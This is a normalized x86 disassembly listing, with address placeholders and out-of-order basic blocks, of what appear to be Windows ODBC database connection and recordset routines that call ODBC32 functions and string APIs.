lea ecx [ ebp - 0x1c ]
push ecx
push [ ebp + 0xc ]
push [ esi + 0x4 ]
push [ eax + 0x4 ]
call Ordinal_ODBC32_10
mov ebx eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_4422d1
mov esi r--data
push r--data
push [ ebp - 0x14 ]
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
cmp bx 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
pop edi
pop ebx
lea eax [ ebp - 0x26c ]
lea ecx [ ebp - 0x10 ]
push eax
call sub_4422d1
push [ ebp - 0x20 ]
lea eax [ ebp - 0x6c ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x6c ]
lea ecx [ ebp - 0x14 ]
push eax
call sub_442524
push esi
lea ecx [ ebp - 0x14 ]
call sub_442524
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x38 ]
push r--data
push eax
call sub_442451
mov ebx [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebx + 0x10 ]
call sub_442560
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_4423dd
push eax
lea ecx [ ebx + 0xc ]
mov [ ebp - 0x4 ] 0x5
call sub_442560
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea eax [ ebp - 0x16 ]
push eax
lea eax [ ebp - 0x26c ]
push edi
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
mov eax [ ebp - 0x28 ]
push [ eax + 0x4 ]
call Ordinal_ODBC32_10
mov ebx eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_4422d1
jmp r-xdata
cmp [ eax ] 0x5b
jne r-xdata
test bx bx
je r-xdata
push 0x5d
lea ecx [ ebp - 0x10 ]
call sub_442621
mov ebx eax
test ebx ebx
jl r-xdata
inc ebx
lea eax [ ebp - 0x2c ]
push ebx
push eax
lea ecx [ ebp - 0x10 ]
call sub_43b1ce
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_442560
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov ecx [ ebp - 0x10 ]
mov eax [ ecx - 0x8 ]
cmp ebx eax
jge r-xdata
sub eax ebx
lea ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_43b152
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x3
call sub_442281
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
jmp r-xdata
cmp [ ebx + ecx ] 0x20
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
inc ebx
sub_420cec
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
lea eax [ esi - 0x1 ]
push eax
push [ ecx + 0xc ]
push edi
call [ lstrcpynA@IAT ]
and [ edi + esi - 0x1 ] 0x0
push 0x1
pop eax
pop edi
pop esi
retn 0xc
and [ eax ] 0x0
sub_420d1c
mov eax sub_46327f
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov eax [ rw-data ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x18 ] eax
push 0xa
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_43cdcd
mov ecx [ ebp - 0xc ]
push 0xf
pop eax
mov [ esi + 0x4 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x54 ] eax
mov [ esi + 0x5c ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_420d99
mov eax sub_4632aa
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_420fee
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_43ce2c
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_420de1
mov eax sub_4632c4
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push ebx
mov ebx [ lstrlenA@IAT ]
push esi
mov esi [ ebp - 0x10 ]
push edi
mov edi r--data
push edi
call ebx
push eax
push edi
push esi
call sub_42dfbf
add esp 0xc
test eax eax
je r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4422d1
mov eax [ ebp - 0x10 ]
push edi
mov esi [ eax - 0x8 ]
call ebx
sub esi eax
lea eax [ ebp + 0x14 ]
push esi
push eax
lea ecx [ ebp - 0x10 ]
call sub_43b152
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_442281
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x14 ]
call sub_442148
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
je r-xdata
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x14
cmp [ ebp + 0x10 ] esi
je r-xdata
push 0x1
pop eax
push r--data
lea ecx [ ebp - 0x10 ]
call sub_442524
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_442524
cmp [ ebp + 0x18 ] esi
je r-xdata
or al 0x2
mov ecx [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
mov edx [ ecx ]
call [ edx + 0x10 ]
mov esi eax
or al 0x4
sub_420ed2
mov eax sub_4632d0
call sub_42dc88
sub esp 0xc
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push ebx
push esi
not eax
push edi
mov esi ecx
shr eax 0x1
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
and eax 0x1
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x14 ] esi
mov [ esi + 0x3c ] eax
call sub_4422d1
push [ ebp + 0xc ]
mov ecx esi
call sub_421157
push [ ebp + 0xc ]
mov ecx esi
call sub_421213
test eax eax
jne r-xdata
mov ecx esi
call sub_4212cb
mov ecx esi
call sub_421352
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
sub_420f42
mov ecx [ ebp - 0x14 ]
call sub_420fee
push 0x0
push 0x0
call sub_42dca7
mov eax sub_4632dc
call sub_42dc88
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push 0xf
call sub_45565c
xor ebx ebx
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
push 0xf
call sub_4556cc
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x20 ]
mov edi [ eax + 0x8 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0x10 ]
mov [ edi + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push eax
call Ordinal_ODBC32_9
push [ esi + 0x4 ]
call Ordinal_ODBC32_14
push sub_453261
mov ecx rw-data
mov [ esi + 0x4 ] ebx
call sub_455223
push 0xf
mov esi eax
call sub_45565c
dec [ esi + 0x8 ]
push 0xf
call sub_4556cc
cmp [ esi + 0x28 ] ebx
je r-xdata
sub_420f8a
push 0xf
call sub_4556cc
xor ebx ebx
push ebx
push ebx
call sub_42dca7
or [ ebp - 0x4 ] 0xffffffff
push 0xf
call sub_4556cc
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push eax
call Ordinal_ODBC32_9
push [ esi + 0x4 ]
call Ordinal_ODBC32_14
push sub_453261
mov ecx rw-data
mov [ esi + 0x4 ] ebx
call sub_455223
push 0xf
mov esi eax
call sub_45565c
dec [ esi + 0x8 ]
push 0xf
call sub_4556cc
sub_420fee
mov eax sub_4632e8
call sub_42dc88
push ecx
push ecx
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call [ eax + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
push sub_453261
mov ecx rw-data
call sub_455223
push 0xf
mov esi eax
call sub_45565c
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0xf
call sub_4556cc
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push eax
call Ordinal_ODBC32_15
and [ esi + 0x4 ] 0x0
sub_421060
push esi
mov esi ecx
mov eax [ esi + 0x5c ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn 0x4
push eax
push 0x0
push [ esp + 0x10 ]
call Ordinal_ODBC32_51
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
jne r-xdata
or [ esi + 0x5c ] 0xffffffff
sub_4210b7
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov ebx ecx
xor ebp ebp
mov edi esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
cmp al 0x27
jne r-xdata
test ebp ebp
jne r-xdata
push esi
call sub_42e14b
cmp [ eax ] 0x27
pop ecx
jne r-xdata
mov [ edi ] al
cmp al 0x5b
jne r-xdata
xor eax eax
test ebp ebp
sete al
mov ebp eax
mov al [ esi ]
push esi
mov [ edi ] al
call sub_42e14b
push edi
mov esi eax
call sub_42e14b
pop ecx
mov edi eax
pop ecx
jmp r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp al 0x5d
jne r-xdata
push esi
call sub_42e14b
cmp [ eax ] 0x5b
pop ecx
je r-xdata
mov al [ esi ]
jmp r-xdata
push esi
call sub_42e14b
cmp [ eax ] 0x5d
pop ecx
jne r-xdata
mov al [ esi ]
push esi
mov [ edi ] al
call sub_42e14b
pop ecx
mov esi eax
jmp r-xdata
mov al [ ebx + 0x14 ]
push esi
call sub_42e14b
push edi
mov esi eax
call sub_42e14b
pop ecx
mov edi eax
pop ecx
jmp r-xdata
sub_421157
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x4 ] 0x0
lea edi [ esi + 0x4 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push ebp
push sub_453261
mov ecx rw-data
call sub_455223
push 0xf
mov ebx eax
call sub_45565c
cmp [ ebx + 0x4 ] 0x0
lea ebp [ ebx + 0x4 ]
jne r-xdata
push edi
push [ ebp ]
call Ordinal_ODBC32_1
mov ebp eax
mov eax [ esi ]
push ebp
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jne r-xdata
push ebp
call Ordinal_ODBC32_2
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
jne r-xdata
inc [ ebx + 0x8 ]
push 0xf
call sub_4556cc
push [ esi + 0x54 ]
push 0x67
push [ edi ]
call Ordinal_ODBC32_50
cmp [ esi + 0x3c ] 0x0
push 0x1
pop ebx
pop ebp
jne r-xdata
push 0xf
call sub_4556cc
mov eax [ esi ]
push ebp
mov ecx esi
call [ eax + 0x24 ]
push 0xf
call sub_4556cc
call sub_43b7b5
test [ esp + 0x10 ] 0x4
je r-xdata
push ebx
push 0x65
push [ edi ]
call Ordinal_ODBC32_50
push ebx
push 0x6e
push [ edi ]
call Ordinal_ODBC32_50
mov [ esi + 0xc ] ebx
sub_421213
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
mov esi ecx
push 0x0
call sub_449748
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x8
push 0x1
pop edx
je r-xdata
call [ GetDesktopWindow@IAT ]
test [ ebp + 0x8 ] 0x10
je r-xdata
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x18 ]
push edx
lea edx [ ebp - 0x6 ]
lea edi [ esi + 0x18 ]
push edx
lea edx [ ebp - 0x208 ]
push 0x200
push edx
push 0xfffffffd
push ecx
push eax
push [ esi + 0x4 ]
call Ordinal_ODBC32_41
cmp [ ebp - 0x4 ] 0x0
mov ebx eax
je r-xdata
push 0x2
pop edx
cmp bx 0x64
jne r-xdata
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jne r-xdata
mov ecx esi
call sub_420fee
xor eax eax
jmp r-xdata
push r--data
mov ecx edi
call sub_4422d1
lea eax [ ebp - 0x208 ]
mov ecx edi
push eax
call sub_442524
push 0x1
pop eax
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x24 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4212cb
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
lea eax [ ebp - 0x2 ]
push 0x2
mov esi ecx
push eax
push 0x9
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x2 ] 0x1
jge r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x6 ]
push 0x2
push eax
push 0xf
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edi eax
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x3f6
mov ecx esi
call [ eax + 0x24 ]
cmp [ ebp - 0x6 ] 0x0
jge r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x24 ]
pop edi
pop esi
leave
retn
mov eax [ esi ]
push 0x3f7
mov ecx esi
call [ eax + 0x24 ]
sub_421352
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp - 0x2 ]
push esi
push eax
lea eax [ ebp - 0xc ]
push 0x4
mov esi ecx
push eax
push 0x4f
push [ esi + 0x4 ]
and [ esi + 0x4c ] 0x0
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2 ]
push ebx
push eax
lea eax [ ebp - 0x10 ]
push 0x4
push eax
push 0x50
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
push 0x2
test eax eax
pop ebx
je r-xdata
test [ ebp - 0xc ] 0x4
je r-xdata
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0x4 ]
push ebx
push eax
push 0x2e
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
je r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
test [ ebp - 0xc ] 0x8
je r-xdata
lea eax [ ebp - 0x2 ]
push edi
lea edi [ esi + 0x46 ]
push eax
push ebx
push edi
push 0x17
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
test [ ebp - 0xc ] 0x10
je r-xdata
lea eax [ ebp - 0x2 ]
lea edi [ esi + 0x48 ]
push eax
push ebx
push edi
push 0x18
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
jne r-xdata
or [ edi ] 0xffff
mov [ esi + 0x40 ] 0x1
or [ esi + 0x4c ] ebx
or [ esi + 0x4c ] 0x1
lea eax [ ebp - 0x2 ]
push eax
lea eax [ esi + 0x50 ]
push 0x4
push eax
push 0x52
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x51
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
pop edi
jne r-xdata
or [ edi ] 0xffff
test [ ebp - 0x14 ] 0x8
je r-xdata
and [ ebp - 0x14 ] eax
cmp [ esi + 0x3c ] 0x0
je r-xdata
or [ esi + 0x4c ] 0x4
push 0x1
push 0x65
push [ esi + 0x4 ]
call Ordinal_ODBC32_50
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0x20 ]
push 0xa
push eax
push 0x19
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
je r-xdata
mov [ esi + 0x14 ] 0x20
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
and [ esi + 0x3c ] 0x0
jmp r-xdata
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
mov al [ ebp - 0x6 ]
mov [ esi + 0x14 ] al
jmp r-xdata
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0x6 ]
push ebx
push eax
push 0x1d
push [ esi + 0x4 ]
call Ordinal_ODBC32_45
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x1c ]
test eax eax
pop ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call [ lstrcmpA@IAT ]
neg eax
sbb eax eax
neg eax
mov [ esi + 0x3c ] eax
jmp r-xdata
pop esi
leave
retn
sub_421517
mov eax sub_46338a
call sub_42dc88
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov eax [ rw-data ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0xc ] eax
mov eax [ rw-data ]
mov [ esi + 0x10 ] eax
push 0xa
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_43d402
push 0xa
lea ecx [ esi + 0x5c ]
mov [ ebp - 0x4 ] 0x3
call sub_43d402
mov eax [ rw-data ]
mov [ esi + 0xa4 ] eax
mov eax [ rw-data ]
mov [ esi + 0xd4 ] eax
mov eax [ rw-data ]
mov [ esi + 0xd8 ] eax
mov eax [ rw-data ]
mov [ esi + 0xdc ] eax
mov eax [ rw-data ]
mov [ esi + 0x104 ] eax
mov eax [ rw-data ]
mov [ esi + 0x108 ] eax
mov eax [ rw-data ]
mov [ esi + 0x10c ] eax
mov eax [ ebp + 0x8 ]
mov [ esi ] r--data
push 0x1
mov [ esi + 0x8 ] eax
pop eax
mov [ ebp - 0x4 ] 0xb
mov [ esi + 0x88 ] eax
or [ esi + 0x90 ] 0xffffffff
or [ esi + 0x30 ] 0xffff
mov [ esi + 0x94 ] edi
mov [ esi + 0x8c ] eax
mov [ esi + 0x2c ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xcc ] edi
mov [ esi + 0xe0 ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0xf8 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0xb4 ] edi
mov [ esi + 0xfc ] 0x19
mov [ esi + 0x100 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0xe8 ] edi
mov [ esi + 0xa0 ] 0xfffffffe
mov [ esi + 0x9c ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x1c ] eax
mov [ esi + 0xec ] edi
mov [ esi + 0xf0 ] edi
mov eax [ esi + 0x8 ]
lea ebx [ esi + 0x4 ]
cmp eax edi
mov [ esi + 0xf4 ] edi
mov [ esi + 0x78 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0xbc ] edi
mov [ ebx ] edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
cmp [ eax + 0x4 ] edi
je r-xdata
push ebx
mov [ ebp - 0x4 ] 0xc
push [ eax + 0x4 ]
call Ordinal_ODBC32_3
push eax
mov ecx esi
call sub_422365
cmp eax edi
jne r-xdata
push 0xf
call sub_45565c
mov ecx [ esi + 0x8 ]
push esi
add ecx 0x1c
mov [ ebp - 0x4 ] 0xd
call sub_43cec6
push 0xf
mov [ ebp - 0x4 ] 0xc
call sub_4556cc
jmp r-xdata
push [ ebx ]
push [ esi + 0x8 ]
push 0xfffffffe
call sub_4209c9
sub_421723
mov eax sub_46342a
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0xc
je r-xdata
cmp [ esi + 0xc0 ] ebx
je r-xdata
call sub_421900
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov ecx [ esi + 0x8 ]
cmp ecx ebx
je r-xdata
lea ecx [ esi + 0x10c ]
mov [ ebp - 0x4 ] 0xa
call sub_442148
lea ecx [ esi + 0x108 ]
mov [ ebp - 0x4 ] 0x9
call sub_442148
lea ecx [ esi + 0x104 ]
mov [ ebp - 0x4 ] 0x8
call sub_442148
lea ecx [ esi + 0xdc ]
mov [ ebp - 0x4 ] 0x7
call sub_442148
lea ecx [ esi + 0xd8 ]
mov [ ebp - 0x4 ] 0x6
call sub_442148
lea ecx [ esi + 0xd4 ]
mov [ ebp - 0x4 ] 0x5
call sub_442148
lea ecx [ esi + 0xa4 ]
mov [ ebp - 0x4 ] 0x4
call sub_442148
lea ecx [ esi + 0x5c ]
mov [ ebp - 0x4 ] 0x3
call sub_43d470
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_43d470
lea ecx [ esi + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea ecx [ esi + 0xc ]
mov [ ebp - 0x4 ] bl
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_42182c
mov eax sub_463434
call sub_42dc88
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push [ ebp + 0x10 ]
mov [ ebp - 0x14 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422387
mov ecx esi
call sub_422433
test eax eax
jne r-xdata
mov eax [ esi ]
push [ esi + 0x4 ]
xor edi edi
mov ecx esi
mov [ ebp - 0x4 ] edi
call [ eax + 0x3c ]
xor ebx ebx
cmp [ esi + 0x14 ] edi
ja r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov ecx esi
call sub_423a99
cmp [ esi + 0x18 ] edi
ja r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
push 0x1
push 0x1
mov ecx esi
call [ eax + 0x14 ]
mov eax [ esi + 0xc8 ]
push 0x1
mov [ esi + 0xc4 ] eax
pop eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
ja r-xdata
push 0x1
pop ebx
jmp r-xdata
mov ecx esi
call sub_423a99
cmp [ esi + 0x18 ] edi
jbe r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_422608
mov ecx esi
call sub_4226e8
mov ecx esi
call sub_4229d6
mov ecx esi
call sub_422b04
cmp ebx edi
je r-xdata
sub_421900
mov eax sub_463440
call sub_42dc88
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
lea ecx [ esi + 0xa4 ]
call sub_4420d3
xor edi edi
cmp [ esi + 0x3c ] edi
je r-xdata
mov ecx esi
call sub_422b34
push [ esi + 0x3c ]
mov [ esi + 0x94 ] edi
call sub_441eb2
pop ecx
mov [ esi + 0x3c ] edi
mov ecx [ esi + 0x38 ]
cmp ecx edi
je r-xdata
cmp [ esi + 0x14 ] edi
jbe r-xdata
push [ esi + 0xec ]
lea ebx [ esi + 0xec ]
mov [ esi + 0x38 ] edi
call sub_441eb2
push [ esi + 0xf0 ]
mov [ ebx ] edi
lea ebx [ esi + 0xf0 ]
call sub_441eb2
cmp [ esi + 0x78 ] edi
pop ecx
pop ecx
mov [ ebx ] edi
je r-xdata
push 0x3
call sub_421aca
cmp [ esi + 0x1c ] edi
je r-xdata
cmp [ esi + 0x7c ] edi
je r-xdata
xor ebx ebx
cmp [ esi + 0x80 ] edi
jbe r-xdata
mov ecx esi
call sub_423fb9
push [ esi + 0xf4 ]
lea ebx [ esi + 0xf4 ]
call sub_441eb2
mov eax [ esi + 0x4 ]
pop ecx
cmp eax edi
mov [ ebx ] edi
je r-xdata
xor ebx ebx
cmp [ esi + 0x84 ] edi
jbe r-xdata
push [ esi + 0x78 ]
call sub_441eb2
pop ecx
mov [ esi + 0x78 ] edi
mov [ esi + 0x80 ] edi
mov eax [ esi + 0x78 ]
push [ eax + ebx * 4 ]
call sub_441eb2
inc ebx
pop ecx
cmp ebx [ esi + 0x80 ]
jb r-xdata
mov eax [ esi + 0xbc ]
lea ebx [ esi + 0xbc ]
cmp eax edi
je r-xdata
push 0x1
push eax
call Ordinal_ODBC32_16
mov [ esi + 0x4 ] edi
push [ esi + 0x7c ]
call sub_441eb2
pop ecx
mov [ esi + 0x7c ] edi
mov [ esi + 0x84 ] edi
mov eax [ esi + 0x7c ]
push [ eax + ebx * 4 ]
call sub_441eb2
inc ebx
pop ecx
cmp ebx [ esi + 0x84 ]
jb r-xdata
push 0xf
call sub_45565c
mov ecx [ esi + 0x8 ]
push edi
push esi
add ecx 0x1c
mov [ ebp - 0x4 ] edi
call sub_43cf74
cmp eax edi
je r-xdata
push 0x1
push eax
call Ordinal_ODBC32_16
mov [ ebx ] edi
or [ ebp - 0x4 ] 0xffffffff
push 0xf
call sub_4556cc
or [ esi + 0x30 ] 0xffff
mov ecx [ ebp - 0xc ]
push 0x1
mov [ esi + 0x90 ] edi
pop eax
mov [ esi + 0xe4 ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xcc ] edi
mov [ esi + 0xe0 ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0xe8 ] edi
mov [ esi + 0xc4 ] eax
mov [ esi + 0xc8 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov ecx [ esi + 0x8 ]
push eax
add ecx 0x1c
call sub_43cf3d
sub_421aca
push ebx
mov bl [ esp + 0x8 ]
push esi
mov esi ecx
test bl 0x2
je r-xdata
mov ecx esi
call j_sub_442148
test bl 0x1
je r-xdata
push edi
lea edi [ esi - 0x4 ]
push j_sub_442148
push [ edi ]
push 0x10
push esi
call sub_42e162
test bl 0x1
je r-xdata
mov eax esi
push esi
call sub_441eb2
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call sub_441eb2
pop ecx
pop esi
pop ebx
retn 0x4
sub_421b1a
mov eax sub_463455
call sub_42dc88
push ecx
push ecx
push esi
mov esi ecx
push edi
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
cmp [ esi + 0x90 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
lea eax [ ebp - 0xe ]
push eax
push [ esi + 0x4 ]
call Ordinal_ODBC32_18
mov edi eax
cmp di 0x2
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x48 ]
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0xe ] ax
je r-xdata
push 0x14
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push 0x1
pop eax
xor edi edi
push edi
call sub_420a4d
mov edi eax
jmp r-xdata
